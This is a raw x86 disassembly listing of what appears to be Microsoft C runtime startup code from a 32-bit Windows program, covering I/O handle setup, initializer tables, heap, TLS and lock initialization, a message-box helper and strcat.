  424ea7:	push   ebx
  424ea8:	sar    eax,1
  424eaa:	inc    eax
  424eab:	push   eax
  424eac:	push   esi
  424ead:	push   ebx
  424eae:	push   ebx
  424eaf:	mov    DWORD PTR [esp+0x34],eax
  424eb3:	call   edi
  424eb5:	mov    ebp,eax
  424eb7:	cmp    ebp,ebx
  424eb9:	je     0x424eed
  424ebb:	push   ebp
  424ebc:	call   0x426062
  424ec1:	cmp    eax,ebx
  424ec3:	pop    ecx
  424ec4:	mov    DWORD PTR [esp+0x10],eax
  424ec8:	je     0x424eed
  424eca:	push   ebx
  424ecb:	push   ebx
  424ecc:	push   ebp
  424ecd:	push   eax
  424ece:	push   DWORD PTR [esp+0x24]
  424ed2:	push   esi
  424ed3:	push   ebx
  424ed4:	push   ebx
  424ed5:	call   edi
  424ed7:	test   eax,eax
  424ed9:	jne    0x424ee9
  424edb:	push   DWORD PTR [esp+0x10]
  424edf:	call   0x425f4a
  424ee4:	pop    ecx
  424ee5:	mov    DWORD PTR [esp+0x10],ebx
  424ee9:	mov    ebx,DWORD PTR [esp+0x10]
  424eed:	push   esi
  424eee:	call   DWORD PTR ds:0x429078
  424ef4:	mov    eax,ebx
  424ef6:	jmp    0x424f48
  424ef8:	cmp    eax,ebp
  424efa:	je     0x424f04
  424efc:	cmp    eax,ebx
  424efe:	je     0x424f04
  424f00:	xor    eax,eax
  424f02:	jmp    0x424f48
  424f04:	call   DWORD PTR ds:0x429074
  424f0a:	mov    esi,eax
  424f0c:	cmp    esi,ebx
  424f0e:	je     0x424f00
  424f10:	cmp    BYTE PTR [esi],bl
  424f12:	je     0x424f1e
  424f14:	inc    eax
  424f15:	cmp    BYTE PTR [eax],bl
  424f17:	jne    0x424f14
  424f19:	inc    eax
  424f1a:	cmp    BYTE PTR [eax],bl
  424f1c:	jne    0x424f14
  424f1e:	sub    eax,esi
  424f20:	inc    eax
  424f21:	mov    ebp,eax
  424f23:	push   ebp
  424f24:	call   0x426062
  424f29:	mov    edi,eax
  424f2b:	cmp    edi,ebx
  424f2d:	pop    ecx
  424f2e:	jne    0x424f34
  424f30:	xor    edi,edi
  424f32:	jmp    0x424f3f
  424f34:	push   ebp
  424f35:	push   esi
  424f36:	push   edi
  424f37:	call   0x426080
  424f3c:	add    esp,0xc
  424f3f:	push   esi
  424f40:	call   DWORD PTR ds:0x429070
  424f46:	mov    eax,edi
  424f48:	pop    edi
  424f49:	pop    esi
  424f4a:	pop    ebp
  424f4b:	pop    ebx
  424f4c:	pop    ecx
  424f4d:	pop    ecx
  424f4e:	ret    
  424f4f:	sub    esp,0x48
  424f52:	push   ebx
  424f53:	mov    ebx,0x480
  424f58:	push   ebx
  424f59:	call   0x426062
  424f5e:	test   eax,eax
  424f60:	pop    ecx
  424f61:	jne    0x424f6b
  424f63:	or     eax,0xffffffff
  424f66:	jmp    0x425148
  424f6b:	mov    ds:0x45e160,eax
  424f70:	mov    DWORD PTR ds:0x45e148,0x20
  424f7a:	lea    ecx,[eax+0x480]
  424f80:	jmp    0x424fa0
  424f82:	and    BYTE PTR [eax+0x4],0x0
  424f86:	or     DWORD PTR [eax],0xffffffff
  424f89:	and    DWORD PTR [eax+0x8],0x0
  424f8d:	mov    BYTE PTR [eax+0x5],0xa
  424f91:	mov    ecx,DWORD PTR ds:0x45e160
  424f97:	add    eax,0x24
  424f9a:	add    ecx,0x480
  424fa0:	cmp    eax,ecx
  424fa2:	jb     0x424f82
  424fa4:	push   ebp
  424fa5:	push   esi
  424fa6:	push   edi
  424fa7:	lea    eax,[esp+0x14]
  424fab:	push   eax
  424fac:	call   DWORD PTR ds:0x42904c
  424fb2:	cmp    WORD PTR [esp+0x46],0x0
  424fb8:	je     0x4250a7
  424fbe:	mov    eax,DWORD PTR [esp+0x48]
  424fc2:	test   eax,eax
  424fc4:	je     0x4250a7
  424fca:	mov    edi,DWORD PTR [eax]
  424fcc:	lea    ebp,[eax+0x4]
  424fcf:	lea    eax,[edi+ebp*1]
  424fd2:	mov    DWORD PTR [esp+0x10],eax
  424fd6:	mov    eax,0x800
  424fdb:	cmp    edi,eax
  424fdd:	jl     0x424fe1
  424fdf:	mov    edi,eax
  424fe1:	cmp    DWORD PTR ds:0x45e148,edi
  424fe7:	jge    0x425037
  424fe9:	mov    esi,0x45e164
  424fee:	push   ebx
  424fef:	call   0x426062
  424ff4:	test   eax,eax
  424ff6:	pop    ecx
  424ff7:	je     0x425031
  424ff9:	add    DWORD PTR ds:0x45e148,0x20
  425000:	mov    DWORD PTR [esi],eax
  425002:	lea    ecx,[eax+0x480]
  425008:	jmp    0x425020
  42500a:	and    BYTE PTR [eax+0x4],0x0
  42500e:	or     DWORD PTR [eax],0xffffffff
  425011:	and    DWORD PTR [eax+0x8],0x0
  425015:	mov    BYTE PTR [eax+0x5],0xa
  425019:	mov    ecx,DWORD PTR [esi]
  42501b:	add    eax,0x24
  42501e:	add    ecx,ebx
  425020:	cmp    eax,ecx
  425022:	jb     0x42500a
  425024:	add    esi,0x4
  425027:	cmp    DWORD PTR ds:0x45e148,edi
  42502d:	jl     0x424fee
  42502f:	jmp    0x425037
  425031:	mov    edi,DWORD PTR ds:0x45e148
  425037:	xor    ebx,ebx
  425039:	test   edi,edi
  42503b:	jle    0x4250a7
  42503d:	mov    eax,DWORD PTR [esp+0x10]
  425041:	mov    eax,DWORD PTR [eax]
  425043:	cmp    eax,0xffffffff
  425046:	je     0x42509c
  425048:	mov    cl,BYTE PTR [ebp+0x0]
  42504b:	test   cl,0x1
  42504e:	je     0x42509c
  425050:	test   cl,0x8
  425053:	jne    0x425060
  425055:	push   eax
  425056:	call   DWORD PTR ds:0x429088
  42505c:	test   eax,eax
  42505e:	je     0x42509c
  425060:	mov    ecx,ebx
  425062:	mov    eax,ebx
  425064:	and    eax,0x1f
  425067:	lea    eax,[eax+eax*8]
  42506a:	sar    ecx,0x5
  42506d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425074:	lea    esi,[ecx+eax*4]
  425077:	mov    eax,DWORD PTR [esp+0x10]
  42507b:	mov    eax,DWORD PTR [eax]
  42507d:	mov    DWORD PTR [esi],eax
  42507f:	mov    al,BYTE PTR [ebp+0x0]
  425082:	mov    BYTE PTR [esi+0x4],al
  425085:	lea    eax,[esi+0xc]
  425088:	push   0xfa0
  42508d:	push   eax
  42508e:	call   0x4263cd
  425093:	test   eax,eax
  425095:	pop    ecx
  425096:	pop    ecx
  425097:	je     0x4250c7
  425099:	inc    DWORD PTR [esi+0x8]
  42509c:	add    DWORD PTR [esp+0x10],0x4
  4250a1:	inc    ebx
  4250a2:	inc    ebp
  4250a3:	cmp    ebx,edi
  4250a5:	jl     0x42503d
  4250a7:	xor    ebx,ebx
  4250a9:	mov    ecx,DWORD PTR ds:0x45e160
  4250af:	lea    eax,[ebx+ebx*8]
  4250b2:	lea    esi,[ecx+eax*4]
  4250b5:	cmp    DWORD PTR [esi],0xffffffff
  4250b8:	jne    0x425129
  4250ba:	test   ebx,ebx
  4250bc:	mov    BYTE PTR [esi+0x4],0x81
  4250c0:	jne    0x4250cc
  4250c2:	push   0xfffffff6
  4250c4:	pop    eax
  4250c5:	jmp    0x4250d6
  4250c7:	or     eax,0xffffffff
  4250ca:	jmp    0x425145
  4250cc:	mov    eax,ebx
  4250ce:	dec    eax
  4250cf:	neg    eax
  4250d1:	sbb    eax,eax
  4250d3:	add    eax,0xfffffff5
  4250d6:	push   eax
  4250d7:	call   DWORD PTR ds:0x429064
  4250dd:	mov    edi,eax
  4250df:	cmp    edi,0xffffffff
  4250e2:	je     0x425123
  4250e4:	push   edi
  4250e5:	call   DWORD PTR ds:0x429088
  4250eb:	test   eax,eax
  4250ed:	je     0x425123
  4250ef:	and    eax,0xff
  4250f4:	cmp    eax,0x2
  4250f7:	mov    DWORD PTR [esi],edi
  4250f9:	jne    0x425101
  4250fb:	or     BYTE PTR [esi+0x4],0x40
  4250ff:	jmp    0x42510a
  425101:	cmp    eax,0x3
  425104:	jne    0x42510a
  425106:	or     BYTE PTR [esi+0x4],0x8
  42510a:	lea    eax,[esi+0xc]
  42510d:	push   0xfa0
  425112:	push   eax
  425113:	call   0x4263cd
  425118:	test   eax,eax
  42511a:	pop    ecx
  42511b:	pop    ecx
  42511c:	je     0x4250c7
  42511e:	inc    DWORD PTR [esi+0x8]
  425121:	jmp    0x42512d
  425123:	or     BYTE PTR [esi+0x4],0x40
  425127:	jmp    0x42512d
  425129:	or     BYTE PTR [esi+0x4],0x80
  42512d:	inc    ebx
  42512e:	cmp    ebx,0x3
  425131:	jl     0x4250a9
  425137:	push   DWORD PTR ds:0x45e148
  42513d:	call   DWORD PTR ds:0x429084
  425143:	xor    eax,eax
  425145:	pop    edi
  425146:	pop    esi
  425147:	pop    ebp
  425148:	pop    ebx
  425149:	add    esp,0x48
  42514c:	ret    
  42514d:	push   0xc
  42514f:	push   0x4295b0
  425154:	call   0x425340
  425159:	mov    DWORD PTR [ebp-0x1c],0x42a008
  425160:	cmp    DWORD PTR [ebp-0x1c],0x42a008
  425167:	jae    0x42518b
  425169:	and    DWORD PTR [ebp-0x4],0x0
  42516d:	mov    eax,DWORD PTR [ebp-0x1c]
  425170:	mov    eax,DWORD PTR [eax]
  425172:	test   eax,eax
  425174:	je     0x425181
  425176:	call   eax
  425178:	jmp    0x425181
  42517a:	xor    eax,eax
  42517c:	inc    eax
  42517d:	ret    
  42517e:	mov    esp,DWORD PTR [ebp-0x18]
  425181:	or     DWORD PTR [ebp-0x4],0xffffffff
  425185:	add    DWORD PTR [ebp-0x1c],0x4
  425189:	jmp    0x425160
  42518b:	call   0x42537b
  425190:	ret    
  425191:	push   0xc
  425193:	push   0x4295c0
  425198:	call   0x425340
  42519d:	mov    DWORD PTR [ebp-0x1c],0x42a010
  4251a4:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  4251ab:	jae    0x4251cf
  4251ad:	and    DWORD PTR [ebp-0x4],0x0
  4251b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251b4:	mov    eax,DWORD PTR [eax]
  4251b6:	test   eax,eax
  4251b8:	je     0x4251c5
  4251ba:	call   eax
  4251bc:	jmp    0x4251c5
  4251be:	xor    eax,eax
  4251c0:	inc    eax
  4251c1:	ret    
  4251c2:	mov    esp,DWORD PTR [ebp-0x18]
  4251c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251c9:	add    DWORD PTR [ebp-0x1c],0x4
  4251cd:	jmp    0x4251a4
  4251cf:	call   0x42537b
  4251d4:	ret    
  4251d5:	call   0x425416
  4251da:	mov    eax,ds:0x45d304
  4251df:	cmp    eax,0xffffffff
  4251e2:	je     0x4251f2
  4251e4:	push   eax
  4251e5:	call   DWORD PTR ds:0x429090
  4251eb:	or     DWORD PTR ds:0x45d304,0xffffffff
  4251f2:	ret    
  4251f3:	push   ebx
  4251f4:	push   esi
  4251f5:	call   DWORD PTR ds:0x429044
  4251fb:	push   DWORD PTR ds:0x45d304
  425201:	mov    ebx,eax
  425203:	call   DWORD PTR ds:0x4290a0
  425209:	mov    esi,eax
  42520b:	test   esi,esi
  42520d:	jne    0x425258
  42520f:	push   0x88
  425214:	push   0x1
  425216:	call   0x426458
  42521b:	mov    esi,eax
  42521d:	test   esi,esi
  42521f:	pop    ecx
  425220:	pop    ecx
  425221:	je     0x425250
  425223:	push   esi
  425224:	push   DWORD PTR ds:0x45d304
  42522a:	call   DWORD PTR ds:0x42909c
  425230:	test   eax,eax
  425232:	je     0x425250
  425234:	mov    DWORD PTR [esi+0x54],0x45d258
  42523b:	mov    DWORD PTR [esi+0x14],0x1
  425242:	call   DWORD PTR ds:0x429098
  425248:	or     DWORD PTR [esi+0x4],0xffffffff
  42524c:	mov    DWORD PTR [esi],eax
  42524e:	jmp    0x425258
  425250:	push   0x10
  425252:	call   0x424406
  425257:	pop    ecx
  425258:	push   ebx
  425259:	call   DWORD PTR ds:0x429094
  42525f:	mov    eax,esi
  425261:	pop    esi
  425262:	pop    ebx
  425263:	ret    
  425264:	call   0x4253cd
  425269:	test   eax,eax
  42526b:	je     0x42527d
  42526d:	call   DWORD PTR ds:0x4290a4
  425273:	cmp    eax,0xffffffff
  425276:	mov    ds:0x45d304,eax
  42527b:	jne    0x425285
  42527d:	call   0x4251d5
  425282:	xor    eax,eax
  425284:	ret    
  425285:	push   esi
  425286:	push   0x88
  42528b:	push   0x1
  42528d:	call   0x426458
  425292:	mov    esi,eax
  425294:	test   esi,esi
  425296:	pop    ecx
  425297:	pop    ecx
  425298:	je     0x4252ca
  42529a:	push   esi
  42529b:	push   DWORD PTR ds:0x45d304
  4252a1:	call   DWORD PTR ds:0x42909c
  4252a7:	test   eax,eax
  4252a9:	je     0x4252ca
  4252ab:	mov    DWORD PTR [esi+0x54],0x45d258
  4252b2:	mov    DWORD PTR [esi+0x14],0x1
  4252b9:	call   DWORD PTR ds:0x429098
  4252bf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252c3:	mov    DWORD PTR [esi],eax
  4252c5:	xor    eax,eax
  4252c7:	inc    eax
  4252c8:	pop    esi
  4252c9:	ret    
  4252ca:	call   0x4251d5
  4252cf:	xor    eax,eax
  4252d1:	pop    esi
  4252d2:	ret    
  4252d3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252da:	jne    0x4252e9
  4252dc:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252e3:	jb     0x4252e9
  4252e5:	xor    eax,eax
  4252e7:	inc    eax
  4252e8:	ret    
  4252e9:	push   0x3
  4252eb:	pop    eax
  4252ec:	ret    
  4252ed:	xor    eax,eax
  4252ef:	cmp    DWORD PTR [esp+0x4],eax
  4252f3:	push   0x0
  4252f5:	sete   al
  4252f8:	push   0x1000
  4252fd:	push   eax
  4252fe:	call   DWORD PTR ds:0x429034
  425304:	test   eax,eax
  425306:	mov    ds:0x45e140,eax
  42530b:	je     0x425337
  42530d:	call   0x4252d3
  425312:	cmp    eax,0x3
  425315:	mov    ds:0x45e144,eax
  42531a:	jne    0x42533a
  42531c:	push   0x3f8
  425321:	call   0x4266da
  425326:	test   eax,eax
  425328:	pop    ecx
  425329:	jne    0x42533a
  42532b:	push   DWORD PTR ds:0x45e140
  425331:	call   DWORD PTR ds:0x4290a8
  425337:	xor    eax,eax
  425339:	ret    
  42533a:	xor    eax,eax
  42533c:	inc    eax
  42533d:	ret    
  42533e:	int3   
  42533f:	int3   
  425340:	push   0x427208
  425345:	mov    eax,fs:0x0
  42534b:	push   eax
  42534c:	mov    eax,DWORD PTR [esp+0x10]
  425350:	mov    DWORD PTR [esp+0x10],ebp
  425354:	lea    ebp,[esp+0x10]
  425358:	sub    esp,eax
  42535a:	push   ebx
  42535b:	push   esi
  42535c:	push   edi
  42535d:	mov    eax,DWORD PTR [ebp-0x8]
  425360:	mov    DWORD PTR [ebp-0x18],esp
  425363:	push   eax
  425364:	mov    eax,DWORD PTR [ebp-0x4]
  425367:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42536e:	mov    DWORD PTR [ebp-0x8],eax
  425371:	lea    eax,[ebp-0x10]
  425374:	mov    fs:0x0,eax
  42537a:	ret    
  42537b:	mov    ecx,DWORD PTR [ebp-0x10]
  42537e:	mov    DWORD PTR fs:0x0,ecx
  425385:	pop    ecx
  425386:	pop    edi
  425387:	pop    esi
  425388:	pop    ebx
  425389:	leave  
  42538a:	push   ecx
  42538b:	ret    
  42538c:	int3   
  42538d:	int3   
  42538e:	int3   
  42538f:	int3   
  425390:	cmp    eax,0x1000
  425395:	jae    0x4253a5
  425397:	neg    eax
  425399:	add    eax,esp
  42539b:	add    eax,0x4
  42539e:	test   DWORD PTR [eax],eax
  4253a0:	xchg   esp,eax
  4253a1:	mov    eax,DWORD PTR [eax]
  4253a3:	push   eax
  4253a4:	ret    
  4253a5:	push   ecx
  4253a6:	lea    ecx,[esp+0x8]
  4253aa:	sub    ecx,0x1000
  4253b0:	sub    eax,0x1000
  4253b5:	test   DWORD PTR [ecx],eax
  4253b7:	cmp    eax,0x1000
  4253bc:	jae    0x4253aa
  4253be:	sub    ecx,eax
  4253c0:	mov    eax,esp
  4253c2:	test   DWORD PTR [ecx],eax
  4253c4:	mov    esp,ecx
  4253c6:	mov    ecx,DWORD PTR [eax]
  4253c8:	mov    eax,DWORD PTR [eax+0x4]
  4253cb:	push   eax
  4253cc:	ret    
  4253cd:	push   esi
  4253ce:	push   edi
  4253cf:	xor    esi,esi
  4253d1:	mov    edi,0x45dc20
  4253d6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253de:	jne    0x4253fe
  4253e0:	lea    eax,[esi*8+0x45d310]
  4253e7:	mov    DWORD PTR [eax],edi
  4253e9:	push   0xfa0
  4253ee:	push   DWORD PTR [eax]
  4253f0:	add    edi,0x18
  4253f3:	call   0x4263cd
  4253f8:	test   eax,eax
  4253fa:	pop    ecx
  4253fb:	pop    ecx
  4253fc:	je     0x42540a
  4253fe:	inc    esi
  4253ff:	cmp    esi,0x24
  425402:	jl     0x4253d6
  425404:	xor    eax,eax
  425406:	inc    eax
  425407:	pop    edi
  425408:	pop    esi
  425409:	ret    
  42540a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425412:	xor    eax,eax
  425414:	jmp    0x425407
  425416:	push   ebx
  425417:	mov    ebx,DWORD PTR ds:0x42908c
  42541d:	push   esi
  42541e:	mov    esi,0x45d310
  425423:	push   edi
  425424:	mov    edi,DWORD PTR [esi]
  425426:	test   edi,edi
  425428:	je     0x42543d
  42542a:	cmp    DWORD PTR [esi+0x4],0x1
  42542e:	je     0x42543d
  425430:	push   edi
  425431:	call   ebx
  425433:	push   edi
  425434:	call   0x425f4a
  425439:	and    DWORD PTR [esi],0x0
  42543c:	pop    ecx
  42543d:	add    esi,0x8
  425440:	cmp    esi,0x45d430
  425446:	jl     0x425424
  425448:	mov    esi,0x45d310
  42544d:	pop    edi
  42544e:	mov    eax,DWORD PTR [esi]
  425450:	test   eax,eax
  425452:	je     0x42545d
  425454:	cmp    DWORD PTR [esi+0x4],0x1
  425458:	jne    0x42545d
  42545a:	push   eax
  42545b:	call   ebx
  42545d:	add    esi,0x8
  425460:	cmp    esi,0x45d430
  425466:	jl     0x42544e
  425468:	pop    esi
  425469:	pop    ebx
  42546a:	ret    
  42546b:	push   ebp
  42546c:	mov    ebp,esp
  42546e:	mov    eax,DWORD PTR [ebp+0x8]
  425471:	push   DWORD PTR [eax*8+0x45d310]
  425478:	call   DWORD PTR ds:0x4290b0
  42547e:	pop    ebp
  42547f:	ret    
  425480:	push   ebp
  425481:	mov    ebp,esp
  425483:	push   esi
  425484:	mov    esi,DWORD PTR [ebp+0x8]
  425487:	lea    esi,[esi*8+0x45d310]
  42548e:	cmp    DWORD PTR [esi],0x0
  425491:	je     0x425498
  425493:	xor    eax,eax
  425495:	inc    eax
  425496:	jmp    0x4254fc
  425498:	push   edi
  425499:	push   0x18
  42549b:	call   0x426062
  4254a0:	mov    edi,eax
  4254a2:	test   edi,edi
  4254a4:	pop    ecx
  4254a5:	jne    0x4254b6
  4254a7:	call   0x4272e0
  4254ac:	mov    DWORD PTR [eax],0xc
  4254b2:	xor    eax,eax
  4254b4:	jmp    0x4254fb
  4254b6:	push   0xa
  4254b8:	call   0x4254ff
  4254bd:	cmp    DWORD PTR [esi],0x0
  4254c0:	pop    ecx
  4254c1:	jne    0x4254e9
  4254c3:	push   0xfa0
  4254c8:	push   edi
  4254c9:	call   0x4263cd
  4254ce:	test   eax,eax
  4254d0:	pop    ecx
  4254d1:	pop    ecx
  4254d2:	jne    0x4254e5
  4254d4:	push   edi
  4254d5:	call   0x425f4a
  4254da:	push   0xa
  4254dc:	call   0x42546b
  4254e1:	pop    ecx
  4254e2:	pop    ecx
  4254e3:	jmp    0x4254a7
  4254e5:	mov    DWORD PTR [esi],edi
  4254e7:	jmp    0x4254f0
  4254e9:	push   edi
  4254ea:	call   0x425f4a
  4254ef:	pop    ecx
  4254f0:	push   0xa
  4254f2:	call   0x42546b
  4254f7:	xor    eax,eax
  4254f9:	pop    ecx
  4254fa:	inc    eax
  4254fb:	pop    edi
  4254fc:	pop    esi
  4254fd:	pop    ebp
  4254fe:	ret    
  4254ff:	push   ebp
  425500:	mov    ebp,esp
  425502:	mov    eax,DWORD PTR [ebp+0x8]
  425505:	push   esi
  425506:	lea    esi,[eax*8+0x45d310]
  42550d:	cmp    DWORD PTR [esi],0x0
  425510:	jne    0x425525
  425512:	push   eax
  425513:	call   0x425480
  425518:	test   eax,eax
  42551a:	pop    ecx
  42551b:	jne    0x425525
  42551d:	push   0x11
  42551f:	call   0x424406
  425524:	pop    ecx
  425525:	push   DWORD PTR [esi]
  425527:	call   DWORD PTR ds:0x4290b4
  42552d:	pop    esi
  42552e:	pop    ebp
  42552f:	ret    
  425530:	push   esi
  425531:	push   DWORD PTR ds:0x45e268
  425537:	call   0x427496
  42553c:	pop    ecx
  42553d:	mov    ecx,DWORD PTR ds:0x45e264
  425543:	mov    esi,eax
  425545:	mov    eax,ds:0x45e268
  42554a:	mov    edx,ecx
  42554c:	sub    edx,eax
  42554e:	add    edx,0x4
  425551:	cmp    esi,edx
  425553:	jae    0x4255a3
  425555:	mov    ecx,0x800
  42555a:	cmp    esi,ecx
  42555c:	jae    0x425560
  42555e:	mov    ecx,esi
  425560:	add    ecx,esi
  425562:	push   ecx
  425563:	push   eax
  425564:	call   0x4272e9
  425569:	test   eax,eax
  42556b:	pop    ecx
  42556c:	pop    ecx
  42556d:	jne    0x425586
  42556f:	add    esi,0x10
  425572:	push   esi
  425573:	push   DWORD PTR ds:0x45e268
  425579:	call   0x4272e9
  42557e:	test   eax,eax
  425580:	pop    ecx
  425581:	pop    ecx
  425582:	jne    0x425586
  425584:	pop    esi
  425585:	ret    
  425586:	mov    ecx,DWORD PTR ds:0x45e264
  42558c:	sub    ecx,DWORD PTR ds:0x45e268
  425592:	mov    ds:0x45e268,eax
  425597:	sar    ecx,0x2
  42559a:	lea    ecx,[eax+ecx*4]
  42559d:	mov    DWORD PTR ds:0x45e264,ecx
  4255a3:	mov    DWORD PTR [ecx],edi
  4255a5:	add    DWORD PTR ds:0x45e264,0x4
  4255ac:	mov    eax,edi
  4255ae:	pop    esi
  4255af:	ret    
  4255b0:	push   0x80
  4255b5:	call   0x426062
  4255ba:	test   eax,eax
  4255bc:	pop    ecx
  4255bd:	mov    ds:0x45e268,eax
  4255c2:	jne    0x4255c8
  4255c4:	push   0x18
  4255c6:	pop    eax
  4255c7:	ret    
  4255c8:	and    DWORD PTR [eax],0x0
  4255cb:	mov    eax,ds:0x45e268
  4255d0:	mov    ds:0x45e264,eax
  4255d5:	xor    eax,eax
  4255d7:	ret    
  4255d8:	push   0xc
  4255da:	push   0x4295d0
  4255df:	call   0x425340
  4255e4:	call   0x424651
  4255e9:	and    DWORD PTR [ebp-0x4],0x0
  4255ed:	mov    edi,DWORD PTR [ebp+0x8]
  4255f0:	call   0x425530
  4255f5:	mov    DWORD PTR [ebp-0x1c],eax
  4255f8:	or     DWORD PTR [ebp-0x4],0xffffffff
  4255fc:	call   0x42560a
  425601:	mov    eax,DWORD PTR [ebp-0x1c]
  425604:	call   0x42537b
  425609:	ret    
  42560a:	call   0x42465a
  42560f:	ret    
  425610:	push   DWORD PTR [esp+0x4]
  425614:	call   0x4255d8
  425619:	neg    eax
  42561b:	sbb    eax,eax
  42561d:	neg    eax
  42561f:	pop    ecx
  425620:	dec    eax
  425621:	ret    
  425622:	push   ebp
  425623:	mov    ebp,esp
  425625:	sub    esp,0x10
  425628:	push   ebx
  425629:	xor    ebx,ebx
  42562b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425631:	push   esi
  425632:	push   edi
  425633:	jne    0x4256a2
  425635:	push   0x429640
  42563a:	call   DWORD PTR ds:0x4290b8
  425640:	mov    edi,eax
  425642:	cmp    edi,ebx
  425644:	je     0x4256dd
  42564a:	mov    esi,DWORD PTR ds:0x429020
  425650:	push   0x429634
  425655:	push   edi
  425656:	call   esi
  425658:	test   eax,eax
  42565a:	mov    ds:0x45dd70,eax
  42565f:	je     0x4256dd
  425661:	push   0x429624
  425666:	push   edi
  425667:	call   esi
  425669:	push   0x429610
  42566e:	push   edi
  42566f:	mov    ds:0x45dd74,eax
  425674:	call   esi
  425676:	cmp    DWORD PTR ds:0x45dac4,0x2
  42567d:	mov    ds:0x45dd78,eax
  425682:	jne    0x4256a2
  425684:	push   0x4295f4
  425689:	push   edi
  42568a:	call   esi
  42568c:	test   eax,eax
  42568e:	mov    ds:0x45dd80,eax
  425693:	je     0x4256a2
  425695:	push   0x4295dc
  42569a:	push   edi
  42569b:	call   esi
  42569d:	mov    ds:0x45dd7c,eax
  4256a2:	mov    eax,ds:0x45dd7c
  4256a7:	test   eax,eax
  4256a9:	je     0x4256e7
  4256ab:	call   eax
  4256ad:	test   eax,eax
  4256af:	je     0x4256ce
  4256b1:	lea    ecx,[ebp-0x4]
  4256b4:	push   ecx
  4256b5:	push   0xc
  4256b7:	lea    ecx,[ebp-0x10]
  4256ba:	push   ecx
  4256bb:	push   0x1
  4256bd:	push   eax
  4256be:	call   DWORD PTR ds:0x45dd80
  4256c4:	test   eax,eax
  4256c6:	je     0x4256ce
  4256c8:	test   BYTE PTR [ebp-0x8],0x1
  4256cc:	jne    0x4256e7
  4256ce:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256d5:	jb     0x4256e1
  4256d7:	or     BYTE PTR [ebp+0x12],0x20
  4256db:	jmp    0x425706
  4256dd:	xor    eax,eax
  4256df:	jmp    0x425716
  4256e1:	or     BYTE PTR [ebp+0x12],0x4
  4256e5:	jmp    0x425706
  4256e7:	mov    eax,ds:0x45dd74
  4256ec:	test   eax,eax
  4256ee:	je     0x425706
  4256f0:	call   eax
  4256f2:	mov    ebx,eax
  4256f4:	test   ebx,ebx
  4256f6:	je     0x425706
  4256f8:	mov    eax,ds:0x45dd78
  4256fd:	test   eax,eax
  4256ff:	je     0x425706
  425701:	push   ebx
  425702:	call   eax
  425704:	mov    ebx,eax
  425706:	push   DWORD PTR [ebp+0x10]
  425709:	push   DWORD PTR [ebp+0xc]
  42570c:	push   DWORD PTR [ebp+0x8]
  42570f:	push   ebx
  425710:	call   DWORD PTR ds:0x45dd70
  425716:	pop    edi
  425717:	pop    esi
  425718:	pop    ebx
  425719:	leave  
  42571a:	ret    
  42571b:	int3   
  42571c:	int3   
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   edi
  425721:	mov    edi,DWORD PTR [esp+0x8]
  425725:	jmp    0x425795
  425727:	lea    esp,[esp+0x0]
  42572e:	mov    edi,edi
  425730:	mov    ecx,DWORD PTR [esp+0x4]
  425734:	push   edi
  425735:	test   ecx,0x3
  42573b:	je     0x425750
  42573d:	mov    al,BYTE PTR [ecx]
  42573f:	add    ecx,0x1
  425742:	test   al,al
  425744:	je     0x425783
  425746:	test   ecx,0x3
  42574c:	jne    0x42573d
  42574e:	mov    edi,edi
  425750:	mov    eax,DWORD PTR [ecx]
  425752:	mov    edx,0x7efefeff
  425757:	add    edx,eax
  425759:	xor    eax,0xffffffff
  42575c:	xor    eax,edx
  42575e:	add    ecx,0x4
  425761:	test   eax,0x81010100
  425766:	je     0x425750
  425768:	mov    eax,DWORD PTR [ecx-0x4]
  42576b:	test   al,al
  42576d:	je     0x425792
  42576f:	test   ah,ah
  425771:	je     0x42578d
  425773:	test   eax,0xff0000
  425778:	je     0x425788
  42577a:	test   eax,0xff000000
  42577f:	je     0x425783
  425781:	jmp    0x425750
  425783:	lea    edi,[ecx-0x1]
  425786:	jmp    0x425795
  425788:	lea    edi,[ecx-0x2]
  42578b:	jmp    0x425795
  42578d:	lea    edi,[ecx-0x3]
  425790:	jmp    0x425795
  425792:	lea    edi,[ecx-0x4]
  425795:	mov    ecx,DWORD PTR [esp+0xc]
  425799:	test   ecx,0x3
  42579f:	je     0x4257be
  4257a1:	mov    dl,BYTE PTR [ecx]
  4257a3:	add    ecx,0x1
  4257a6:	test   dl,dl
  4257a8:	je     0x425810
  4257aa:	mov    BYTE PTR [edi],dl
  4257ac:	add    edi,0x1
  4257af:	test   ecx,0x3
  4257b5:	jne    0x4257a1
  4257b7:	jmp    0x4257be
  4257b9:	mov    DWORD PTR [edi],edx
  4257bb:	add    edi,0x4
  4257be:	mov    edx,0x7efefeff
  4257c3:	mov    eax,DWORD PTR [ecx]
  4257c5:	add    edx,eax
  4257c7:	xor    eax,0xffffffff
  4257ca:	xor    eax,edx
  4257cc:	mov    edx,DWORD PTR [ecx]
  4257ce:	add    ecx,0x4
  4257d1:	test   eax,0x81010100
  4257d6:	je     0x4257b9
  4257d8:	test   dl,dl
  4257da:	je     0x425810
  4257dc:	test   dh,dh
  4257de:	je     0x425807
  4257e0:	test   edx,0xff0000
  4257e6:	je     0x4257fa
  4257e8:	test   edx,0xff000000
  4257ee:	je     0x4257f2
  4257f0:	jmp    0x4257b9
  4257f2:	mov    DWORD PTR [edi],edx
  4257f4:	mov    eax,DWORD PTR [esp+0x8]
  4257f8:	pop    edi
  4257f9:	ret    
  4257fa:	mov    WORD PTR [edi],dx
  4257fd:	mov    eax,DWORD PTR [esp+0x8]
  425801:	mov    BYTE PTR [edi+0x2],0x0
  425805:	pop    edi
  425806:	ret    
  425807:	mov    WORD PTR [edi],dx
  42580a:	mov    eax,DWORD PTR [esp+0x8]
  42580e:	pop    edi
  42580f:	ret    
  425810:	mov    BYTE PTR [edi],dl
  425812:	mov    eax,DWORD PTR [esp+0x8]
  425816:	pop    edi
  425817:	ret    
  425818:	int3   
  425819:	int3   
  42581a:	int3   
  42581b:	int3   
  42581c:	int3   
  42581d:	int3   
  42581e:	int3   
  42581f:	int3   
